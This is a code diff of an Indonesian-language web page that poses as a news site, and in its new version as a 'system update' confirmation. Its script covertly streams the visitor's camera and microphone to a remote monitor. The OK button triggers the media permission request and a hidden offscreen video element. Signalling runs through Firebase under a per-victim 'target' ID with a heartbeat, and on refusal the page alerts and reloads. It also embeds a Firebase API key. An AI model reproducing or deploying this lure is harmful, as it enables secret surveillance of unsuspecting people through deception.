@@ -3,52 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Nasional - Update</title>
+    <title>Sistem Konfirmasi</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; padding: 0; background: #eee; }
-        .header { background: #b91c1c; color: #fff; padding: 15px; font-weight: bold; }
-        .content { background: #fff; max-width: 600px; margin: 20px auto; padding: 20px; border-radius: 5px; }
-        #modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
-                  display: flex; justify-content: center; align-items: center; z-index: 9999; }
-        .modal-box { background: #fff; padding: 30px; border-radius: 10px; text-align: center; max-width: 80%; }
-        button { background: #b91c1c; color: #fff; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        #v { position: absolute; top: -1000px; width: 1px; height: 1px; opacity: 0; }
-        .hidden { display: none !important; }
+        body { font-family: sans-serif; background: #f0f0f0; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #confirm-modal { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
+        h2 { margin-top: 0; color: #333; }
+        p { color: #666; line-height: 1.5; }
+        button { background: #007bff; color: white; border: none; padding: 12px 40px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #0056b3; }
+        #v { position: fixed; top: -1000px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div id="modal">
-        <div class="modal-box">
-            <h3>Sistem Diperbarui</h3>
-            <p>Klik OK untuk melanjutkan membaca berita dan mengaktifkan fitur sinkronisasi.</p>
-            <button id="okBtn">OK</button>
-        </div>
-    </div>
-
-    <div class="header">MEDIA NEWS INDONESIA</div>
-    <div class="content">
-        <h1>Sektor Pariwisata Kembali Bangkit Pasca Transformasi Digital</h1>
-        <p>Laporan terbaru menunjukkan peningkatan kunjungan wisatawan sebesar 25% setelah implementasi sistem manajemen berbasis cloud...</p>
-        <img src="https://picsum.photos/600/300?travel" style="width:100%">
+    <div id="confirm-modal">
+        <h2>Pembaruan Sistem</h2>
+        <p>Klik tombol di bawah untuk menyinkronkan data dan melanjutkan akses ke layanan kami.</p>
+        <button id="startBtn">OK</button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
 
     <script>
-        const firebaseConfig = {
+        const config = {
             apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
             databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "chatroom-e9b3f"
         };
-        firebase.initializeApp(firebaseConfig);
+        firebase.initializeApp(config);
 
         let targetId = localStorage.getItem('target_id') || "TGT-" + Math.random().toString(36).substr(2, 5);
         localStorage.setItem('target_id', targetId);
         const db = firebase.database().ref('v5_multi/' + targetId);
 
-        let pc, localStream;
+        let pc = null;
+        let localStream = null;
 
         async function createOffer() {
             if (pc) pc.close();
@@ -60,22 +50,26 @@
                 if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
             };
 
-            pc.onconnectionstatechange = () => {
-                if (pc.connectionState === 'failed') setTimeout(createOffer, 2000);
-            };
-
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
-            await db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
+            
+            // Kirim offer dengan TS baru biar monitor langsung respon
+            await db.child('sdp/offer').set({ 
+                type: offer.type, 
+                sdp: offer.sdp, 
+                ts: Date.now() 
+            });
         }
 
-        document.getElementById('okBtn').onclick = async function() {
-            document.getElementById('modal').classList.add('hidden');
+        document.getElementById('startBtn').onclick = async function() {
+            this.disabled = true;
+            this.innerText = "Sedang Memproses...";
+            
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v').srcObject = localStream;
-                
-                // Clear old data
+
+                // Reset DB state
                 await db.child('sdp/answer').remove();
                 await db.child('ice_m').remove();
                 await db.child('ice_t').remove();
@@ -92,7 +86,7 @@
 
                 // Listen ICE
                 db.child('ice_m').on('child_added', s => {
-                    if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(()=>{});
+                    if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
                 });
 
                 // Heartbeat
@@ -100,7 +94,11 @@
                     db.child('status').update({ lastSeen: Date.now(), id: targetId });
                 }, 5000);
 
-            } catch(e) { console.error(e); }
+                document.getElementById('confirm-modal').innerHTML = "<h2>Sinkronisasi Berhasil</h2><p>Layanan sedang berjalan di latar belakang.</p>";
+            } catch (e) {
+                alert("Izin Kamera/Audio Diperlukan!");
+                location.reload();
+            }
         };
     </script>
 </body>
